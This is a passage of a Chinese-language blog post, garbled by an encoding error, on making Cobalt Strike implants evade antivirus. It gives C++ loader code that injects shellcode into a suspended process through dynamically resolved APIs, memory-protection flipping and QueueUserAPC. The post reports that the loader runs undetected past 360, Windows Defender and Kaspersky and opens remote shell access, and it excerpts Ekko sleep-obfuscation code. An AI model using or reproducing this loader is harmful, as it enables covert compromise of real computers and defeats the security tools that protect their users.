lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPCSTR                lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPSTARTUPINFOA        lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">	)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">LPVOID</span><span class="params">(WINAPI* pVirtualAllocEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD  flAllocationType,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD  flProtect</span></span></span><br><span class="line"><span class="params"><span class="function">	)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* pVirtualProtect)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD  flNewProtect,</span></span></span><br><span class="line"><span class="params"><span class="function">	PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="params"><span class="function">	)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* pWriteProcessMemory)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE  hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID  lpBaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPCVOID lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T  nSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T* lpNumberOfBytesWritten</span></span></span><br><span class="line"><span class="params"><span class="function">	)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* pQueueUserAPC)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	PAPCFUNC  pfnAPC,</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE    hThread,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG_PTR dwData</span></span></span><br><span class="line"><span class="params"><span class="function">	)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GoHere</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	si.cb = <span class="built_in">sizeof</span>(STARTUPINFO);</span><br><span class="line"></span><br><span class="line">	HMODULE hKernel32 = <span class="built_in">GetModuleHandleW</span>(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">	pCreateProcessA MyCreateProcess = (pCreateProcessA)<span class="built_in">GetProcAddress</span>(hKernel32, CreateP);</span><br><span class="line">	pVirtualAllocEx MyVirtualAlloc = (pVirtualAllocEx)<span class="built_in">GetProcAddress</span>(hKernel32, VirAloc);</span><br><span class="line">	pVirtualProtect MyVirProtect = (pVirtualProtect)<span class="built_in">GetProcAddress</span>(hKernel32, VirPro);</span><br><span class="line">	pWriteProcessMemory MyWriteMen = (pWriteProcessMemory)<span class="built_in">GetProcAddress</span>(hKernel32, WriteMem);</span><br><span class="line">	pQueueUserAPC MyQueueAPC = (pQueueUserAPC)<span class="built_in">GetProcAddress</span>(hKernel32, QueAPC);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">MyCreateProcess</span>(text_path, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOA)&amp;si, &amp;pi);</span><br><span class="line">	LPVOID lpBaseeAddresss = (LPVOID)<span class="built_in">MyVirtualAlloc</span>(pi.hProcess, <span class="literal">NULL</span>, <span class="number">0X400200</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	DWORD oldProtect;</span><br><span class="line">	<span class="built_in">MyVirProtect</span>(lpBaseeAddresss, <span class="keyword">sizeof</span> fish, PAGE_NOACCESS, &amp;oldProtect);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">986</span>; i++);</span><br><span class="line">	<span class="built_in">MyVirProtect</span>(lpBaseeAddresss, <span class="keyword">sizeof</span> fish, PAGE_READWRITE, &amp;oldProtect);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">777</span>; i++);</span><br><span class="line">	<span class="built_in">MyVirProtect</span>(lpBaseeAddresss, <span class="keyword">sizeof</span> fish, PAGE_NOACCESS, &amp;oldProtect);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">321</span>; i++);</span><br><span class="line">	<span class="built_in">MyVirProtect</span>(lpBaseeAddresss, <span class="keyword">sizeof</span> fish, PAGE_READWRITE, &amp;oldProtect);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">123</span>; i++);</span><br><span class="line">	<span class="built_in">MyVirProtect</span>(lpBaseeAddresss, <span class="keyword">sizeof</span> fish, PAGE_NOACCESS, &amp;oldProtect);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++);</span><br><span class="line">	<span class="built_in">MyVirProtect</span>(lpBaseeAddresss, <span class="keyword">sizeof</span> fish, PAGE_EXECUTE_READ, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Sleep</span>(<span class="number">15000</span>);</span><br><span class="line">	<span class="built_in">MyWriteMen</span>(pi.hProcess, lpBaseeAddresss, (LPVOID)fish, <span class="built_in">sizeof</span>(fish), <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">MyQueueAPC</span>((PAPCFUNC)lpBaseeAddresss, pi.hThread, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">ResumeThread</span>(pi.hThread);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å·¥å…·ç”Ÿæˆçš„junkCodeè¿›è¡Œå¡«å……ï¼Œå¤ªé•¿äº†å°±ä¸å†™äº†</span></span><br></pre></td></tr></table></figure><br>ç¼–è¯‘å®Œåè¿˜å¯ä»¥è¿›ä¸€æ­¥æ“ä½œï¼Œæ¯”å¦‚æ›¿æ¢ ico å›¾æ ‡ï¼Œæ·»åŠ ä¼ªç­¾åç­‰ç­‰ã€‚è¿™é‡Œæˆ‘åªè¿›è¡Œå›¾æ ‡çš„æ›¿æ¢æµ‹è¯•äº† 360 (æ ¸æ™¶æ¨¡å¼)ã€windowDefinder (ä¸ªäººç‰ˆã€ä¼ä¸šç‰ˆã€ä¸“ä¸šç‰ˆ)ã€å¡å·´æ–¯åŸº (å…è´¹ç‰ˆ)ï¼Œå…¶ä¸­é™¤äº† wdf ä¸“ä¸šç‰ˆæ— æ³•ä¸Šçº¿ä¹‹å¤–å…¶ä»–éƒ½èƒ½åšåˆ°æ— æ„Ÿä¸Šçº¿ï¼Œå¹¶ä¸”å¯ä»¥ç›´æ¥æ‰§è¡Œ shell å‘½ä»¤ (å½“ç„¶è¿™é‡Œæˆ‘ç”¨çš„æ˜¯ cs4.9 å¹¶ä¸”é…ç½®äº† C2profile æœ‰ä¸€å®šçš„æµé‡è§„é¿æ•ˆæœ)ã€‚<p></p><p><strong>360 æ ¸æ™¶</strong>ï¼š<img data-src="https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hrpqnl0tgyj31c00u0gs7.jpg" alt=""><br><strong>wdf (çœŸå®ç¯å¢ƒè¿œç¨‹ä¸Šçº¿ ==&gt; æ‰§è¡Œ screenshot)</strong>ï¼š<img data-src="https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hrpqr5hiihj316c0pi7an.jpg" alt=""><br><strong>å¡å·´æ–¯åŸº</strong>ï¼š<img data-src="https://dlink.host/wx3.sinaimg.cn/large/008DfUDOly8hrpqnosm7hj31u70u0dqa.jpg" alt=""><br><strong>360 æ€æ¯’ + 360 æ ¸æ™¶ä¼šæŠ¥è­¦å‘Šæç¤º</strong></p><h5 id="ekkoç¡çœ æ··æ·†æŠ€æœ¯æ¼”ç¤º"><a class="anchor" href="#ekkoç¡çœ æ··æ·†æŠ€æœ¯æ¼”ç¤º">#</a> Ekko ç¡çœ æ··æ·†æŠ€æœ¯æ¼”ç¤ºï¼š</h5><p>è¯¥é¡¹ç›®ä¹Ÿæ˜¯ havoC2 çš„ä½œè€…çš„ï¼Œå·²ç»é›†æˆåœ¨äº† havoc ä¸Šï¼Œåœ¨è¿™æˆ‘ä»¬å•ç‹¬æŠŠè¿™ä¸ªé¡¹ç›®è¿è¡Œçœ‹çœ‹ï¼Œå°† github ä¸Šçš„é¡¹ç›®æ‹‰å–åˆ°æœ¬åœ°å³å¯ï¼Œç¼–è¯‘å™¨ç”¨çš„æ˜¯ visual studio2022ã€‚å…¶æ··æ·†åŸç†ç®€å•æ¥è¯´å°±æ˜¯åœ¨ä¸€ä¸ªå‘¨æœŸå†…ç¡çœ ç»“æŸåçš„å‡ åæ¯«ç§’å†…å°†å†…å­˜ä¸­ä»£ç æ®µè¿›è¡Œå¼‚æˆ–æ¢å¤åˆ°æ­£å¸¸åŠŸèƒ½ä»£ç ï¼Œå¹¶åŒæ—¶æ¢å¤ RX å±æ€§ã€‚<br>æˆ‘ä»¬éœ€è¦å…³æ³¨çš„ä»£ç æ®µå°±åœ¨ Ekko.c ä¸­ï¼Œè¿™é‡Œæˆ‘ä»¬å•ç‹¬æç‚¼å‡ºæ¥ï¼š<br></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ImageBase = <span class="built_in">GetModuleHandleA</span>(<span class="literal">NULL</span>);     <span class="comment">//è·å–å½“å‰è¿›ç¨‹åŸºå€</span></span><br><span class="line"><span class="comment">//è·å–è¯¥æœ¬è¿›ç¨‹å†…å­˜é•œåƒå¤§å°</span></span><br><span class="line">PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">DWORD e_lfanew = dosHeader-&gt;e_lfanew;</span><br><span class="line">PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((<span class="type">char</span>*)ImageBase + e_lfanew);</span><br><span class="line">ImageSize = ntHeaders-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ImageSize = 0x0005e6b4;</span></span><br></pre></td></tr></table></figure><br>è¿™é‡Œè·å–å†…å­˜é•œåƒå¤§å°çš„ä»£ç æˆ‘åšäº†ä¿®æ”¹ï¼ŒåŸé¡¹ç›®çš„ä»£ç åœ¨æˆ‘æœ¬åœ°è¿è¡Œæ—¶è·å–åˆ°çš„å¤§å°å§‹ç»ˆä¸º 0ï¼Œæš‚æ—¶ä¹Ÿä¸æ¸…æ¥šä»€ä¹ˆæƒ…å†µã€‚<br>è¿™é‡Œæˆ‘ä»¬ä¿®æ”¹å®Œåå†ç¼–è¯‘å³å¯ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ messagebox æ¥æ¨¡æ‹Ÿ c2 æœåŠ¡ç«¯å‘é€çš„æŒ‡ä»¤ï¼Œä½¿ç”¨<strong> ProcessHacker</strong> ç›‘æ§å†…å­˜å˜æ¢ã€‚<p></p><p><em><strong>éç¡çœ æ—¶é—´æ®µ (äº‹ä»¶ç­‰å¾…æ—¶é—´æ®µ)ï¼š</strong></em><br><img data-src="https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hrpvp4d5wtj31cz0u0x05.jpg" alt=""><br><em><strong>ç¡çœ æ··æ·†æ—¶é—´æ®µï¼š</strong></em><br><img data-src="https://dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hrpvp7ovgyj31cu0u0aux.jpg" alt=""></p><div class="tags"><a href="/tags/%E5%85%8D%E6%9D%80/" rel="tag"><i class="ic i-tag"></i> å…æ€</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">æ›´æ–°äº</span> <time title="ä¿®æ”¹æ—¶é—´ï¼š2024-07-16 14:54:20" itemprop="dateModified" datetime="2024-07-16T14:54:20+08:00">2024-07-16</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i> èµèµ</button><p>è¯·æˆ‘å–[èŒ¶]~(ï¿£â–½ï¿£)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="shutTD å¾®ä¿¡æ”¯ä»˜"><p>å¾®ä¿¡æ”¯ä»˜</p></div><div><img data-src="/images/alipay.png" alt="shutTD æ”¯ä»˜å®"><p>æ”¯ä»˜å®</p></div></div></div><div id="copyright"><ul><li class="author"><strong>æœ¬æ–‡ä½œè€…ï¼š </strong>shutTD <i class="ic i-at"><em>@</em></i>shutTD</li><li class="link"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong> <a href="https://shut-td.github.io/CS%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0/" title="CS è¿œæ§å…æ€æ€è·¯ä¸å®ç°">https://shut-td.github.io/CSè¿œæ§å…æ€æ€è·¯ä¸å®ç°/</a></li><li class="license"><strong>ç‰ˆæƒå£°æ˜ï¼š </strong>æœ¬ç«™æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/CMD%E5%91%BD%E4%BB%A4%E6%B7%B7%E6%B7%86/" itemprop="url" rel="prev" data-background-image="http:&#x2F;&#x2F;dlink.host&#x2F;wx2.sinaimg.cn&#x2F;large&#x2F;008DfUDOly8hnqx14nahdj31hc0u041l.jpg" title="CMDå‘½ä»¤æ··æ·†"><span class="type">ä¸Šä¸€ç¯‡</span> <span class="category"><i class="ic i-flag"></i> æ”»é˜²æŠ€å·§</span><h3>CMDå‘½ä»¤æ··æ·†</h3></a></div><div class="item right"><a href="/%E5%86%85%E7%BD%91frp%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BAsocks5/" itemprop="url" rel="next" data-background-image="http:&#x2F;&#x2F;dlink.host&#x2F;wx2.sinaimg.cn&#x2F;large&#x2F;008DfUDOly8hnqx14nahdj31hc0u041l.jpg" title="å†…ç½‘frpä»£ç†æ­å»ºsocks5"><span class="type">ä¸‹ä¸€ç¯‡</span> <span class="category"><i class="ic i-flag"></i> æ”»é˜²æŠ€å·§</span><h3>å†…ç½‘frpä»£ç†æ­å»ºsocks5</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="æ–‡ç« ç›®å½•"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#cs%E5%8E%9F%E7%94%9Fshellcode%E4%B8%8A%E7%BA%BF%E5%85%8D%E6%9D%80"><span class="toc-number">1.</span> <span class="toc-text">CS åŸç”Ÿ shellcode ä¸Šçº¿å…æ€</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#shellcode%E5%85%8D%E6%9D%80"><span class="toc-number">1.0.1.</span> <span class="toc-text">shellcode å…æ€</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E4%B8%8E%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">ä»£ç ä¸è¿›ç¨‹æ³¨å…¥æ‰‹æ³•</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%B5%8B%E8%AF%95%E6%95%88%E6%9E%9C%E5%92%8C%E5%85%B6%E4%BB%96%E6%89%8B%E6%B3%95%E6%BC%94%E7%A4%BA"><span class="toc-number">1.2.</span> <span class="toc-text">æœ¬åœ°æµ‹è¯•æ•ˆæœå’Œå…¶ä»–æ‰‹æ³•æ¼”ç¤º</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ekko%E7%9D%A1%E7%9C%A0%E6%B7%B7%E6%B7%86%E6%8A%80%E6%9C%AF%E6%BC%94%E7%A4%BA"><span class="toc-number">1.2.1.</span> <span class="toc-text">Ekko ç¡çœ æ··æ·†æŠ€æœ¯æ¼”ç¤ºï¼š</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="ç³»åˆ—æ–‡ç« "><ul><li><a href="/%E7%BB%99EXE%E4%B8%8A%E9%94%81/" rel="bookmark" title="ç»™EXEä¸Šé”">ç»™EXEä¸Šé”</a></li><li class="active"><a href="/CS%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0/" rel="bookmark" title="CSè¿œæ§å…æ€æ€è·¯ä¸å®ç°">CSè¿œæ§å…æ€æ€è·¯ä¸å®ç°</a></li></ul></div><div class="overview panel" data-title="ç«™ç‚¹æ¦‚è§ˆ"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="shutTD" data-src="/images/avatar.jpg"><p class="name" itemprop="name">shutTD</p><div class="description" itemprop="description">èœåªå› ï½</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">7</span> <span class="name">æ–‡ç« </span></a></div><div class="item categories"><a href="/categories/"><span class="count">4</span> <span class="name">åˆ†ç±»</span></a></div><div class="item tags"><a href="/tags/"><span class="count">4</span> <span class="name">æ ‡ç­¾</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NodXQtVEQ=" title="https:&#x2F;&#x2F;github.com&#x2F;shut-TD"><i class="ic i-github"></i></span> <span class="exturl item email" data-url="bWFpbHRvOjIzMDY2Njg3ODFAcXEuY29t" title="mailto:2306668781@qq.com"><i class="ic i-envelope"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>é¦–é¡µ</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>æ–‡ç« </a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>å½’æ¡£</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>åˆ†ç±»</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>æ ‡ç­¾</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/CMD%E5%91%BD%E4%BB%A4%E6%B7%B7%E6%B7%86/" rel="prev" title="ä¸Šä¸€ç¯‡"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/%E5%86%85%E7%BD%91frp%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BAsocks5/" rel="next" title="ä¸‹ä¸€ç¯‡"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>éšæœºæ–‡ç« </h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E5%B7%A7/" title="åˆ†ç±»äº æ”»é˜²æŠ€å·§">æ”»é˜²æŠ€å·§</a></div><span><a href="/%E5%86%85%E7%BD%91frp%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BAsocks5/" title="å†…ç½‘frpä»£ç†æ­å»ºsocks5">å†…ç½‘frpä»£ç†æ­å»ºsocks5</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E5%B7%A7/" title="åˆ†ç±»äº æ”»é˜²æŠ€å·§">æ”»é˜²æŠ€å·§</a></div><span><a href="/CMD%E5%91%BD%E4%BB%A4%E6%B7%B7%E6%B7%86/" title="CMDå‘½ä»¤æ··æ·†">CMDå‘½ä»¤æ··æ·†</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" title="åˆ†ç±»äº Pwn">Pwn</a></div><span><a href="/%E6%84%8F%E5%A4%96%E7%9A%84Kernel32%E5%9F%BA%E5%9D%80%E5%AF%BB%E5%9D%80/" title="æ„å¤–çš„Kernel32åŸºå€å¯»å€">æ„å¤–çš„Kernel32åŸºå€å¯»å€</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/%E8%87%AA%E6%88%91%E5%AE%9A%E4%BD%8D-%E6%9C%AA%E6%9D%A5%E5%B1%95%E6%9C%9B-To-Future/" title="è‡ªæˆ‘å®šä½ &amp; æœªæ¥å±•æœ› To Future~">è‡ªæˆ‘å®šä½ & æœªæ¥å±•æœ› To Future~</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/" title="åˆ†ç±»äº å®‰å…¨å·¥å…·å¼€å‘">å®‰å…¨å·¥å…·å¼€å‘</a></div><span><a href="/%E6%BA%90%E7%A0%81%E5%8F%8D%E7%BC%96%E8%AF%91%E5%8F%8A%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98-CS%E4%BA%8C%E5%BC%80%E7%B3%BB%E5%88%97/" title="æºç åç¼–è¯‘åŠæ­å»ºé—®é¢˜[CSäºŒå¼€ç³»åˆ—]">æºç åç¼–è¯‘åŠæ­å»ºé—®é¢˜[CSäºŒå¼€ç³»åˆ—]</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%85%8D%E6%9D%80/" title="åˆ†ç±»äº å…æ€">å…æ€</a></div><span><a href="/CS%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0/" title="CSè¿œæ§å…æ€æ€è·¯ä¸å®ç°">CSè¿œæ§å…æ€æ€è·¯ä¸å®ç°</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%85%8D%E6%9D%80/" title="åˆ†ç±»äº å…æ€">å…æ€</a></div><span><a href="/%E7%BB%99EXE%E4%B8%8A%E9%94%81/" title="ç»™EXEä¸Šé”">ç»™EXEä¸Šé”</a></span></li></ul></div><div><h2>æœ€æ–°è¯„è®º</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; <span itemprop="copyrightYear">2024</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">shutTD @ shutTD's BLOG</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="ç«™ç‚¹æ€»å­—æ•°">20k å­—</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="ç«™ç‚¹é˜…è¯»æ—¶é•¿">19 åˆ†é’Ÿ</span></div><div class="powered-by">åŸºäº <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"CSè¿œæ§å…æ€æ€è·¯ä¸å®ç°/",favicon:{show:"ï¼ˆâ—Â´3ï½€â—ï¼‰å¥½å•¦å¥½å•¦",hide:"åå–½åå–½"},search:{placeholder:"æ–‡ç« æœç´¢",empty:"å…³äº ã€Œ ${query} ã€ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœåˆ°",stats:"${time} ms å†…æ‰¾åˆ° ${hits} æ¡ç»“æœ"},valine:!0,fancybox:!0,copyright:'å¤åˆ¶æˆåŠŸï¼Œè½¬è½½è¯·éµå®ˆ <i class="ic i-creative-commons"></i>BY-NC-SA åè®®ã€‚',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html>